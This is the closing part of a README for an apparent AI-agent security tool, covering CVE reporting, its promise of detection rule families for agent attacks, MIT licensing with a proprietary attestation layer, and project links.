To report a CVE: <SECURITY.md>

Every new CVE filed against an AI agent gets a rule family — regardless of whether the attack came through MCP, a direct API call, or a malicious subprocess. If you find something not covered, open an issue.

-----

## License

MIT. See <LICENSE>.

The attestation layer (HMAC-signed JSON session artifacts, RSA-2048 signed at artifact level, verifiable offline) and cloud dashboard are proprietary. See [aiglos.dev/pricing](https://aiglos.dev/pricing).

-----

<div align="center">

[aiglos.dev](https://aiglos.dev) · [docs](https://docs.aiglos.dev) · [discord](https://discord.gg/aiglos) · [security@aiglos.dev](mailto:security@aiglos.dev)

</div>